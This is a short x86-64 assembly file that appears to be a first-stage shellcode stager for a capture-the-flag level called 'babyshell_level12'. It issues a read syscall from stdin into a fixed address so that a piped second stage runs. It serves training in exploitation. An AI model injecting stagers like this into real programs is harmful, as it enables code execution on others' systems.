.intel_syntax noprefix

# we need a second file that contains the second stage
# cat first-stage - second-stage | /challenge/babyshell_level12

.section .text    
    push 0      
    pop rdi     # set rdi to input
    lea rsi, [0x246b3013]   # we know exactly where the code ends
    xor r11, r11
    mov rax, r11
    syscall
    nop